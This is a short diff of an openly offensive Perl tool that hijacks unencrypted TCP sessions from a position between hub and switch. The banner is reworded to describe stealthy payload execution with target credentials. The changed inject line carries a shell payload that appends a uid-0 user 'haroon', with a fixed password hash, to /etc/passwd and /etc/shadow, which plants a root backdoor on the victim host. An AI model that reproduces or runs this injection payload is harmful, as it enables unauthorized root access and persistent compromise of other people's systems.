@@ -44,7 +44,7 @@ print "[ + ] Version: 		1.0\n";
 print "[ + ] Contact: 		mrharoonawan\@gmail\.com \n";
 print "[ + ] Environment: 	Perl for Debian/Kali\n";
 print "[ + ] Github: 		Https://www.github.com/haroonawanofficial\n";
-print "[ + ] Design Scheme: 	TCP-IP Connection Intruder will intrude any un-ecrypted protocol and execute strings in it\n";
+print "[ + ] Design Scheme: 	This software will intrude any unencrypted protocol and execute data payload using target credentials stealthly\n";
 print color('reset');
 print color("bold green"),"\n[ + ] Starting TCP-IP Data Connection \n";
 print color("bold green"),"[ + ] Sitting between HUB/SWITCH \n";
@@ -92,7 +92,7 @@ dest => $tcp->{src_port},
 rst => 1,
 seq => $ip->{acknum},
 #Inject data
-data => echo 'haroon:x:0:0::/:/bin/sh' >> /etc/passwd && echo 'haroon:\$1\$u70t2mzi\$v8VeFsr3uFwbl772vjb/a0:12019:0:99999:7:::' >> /etc/shadow
+data => 'echo haroon:x:0:0::/:/bin/sh >> /etc/passwd && echo haroon:\$1\$u70t2mzi\$v8VeFsr3uFwbl772vjb/a0:12019:0:99999:7::: >> /etc/shadow'
 }
 });
 
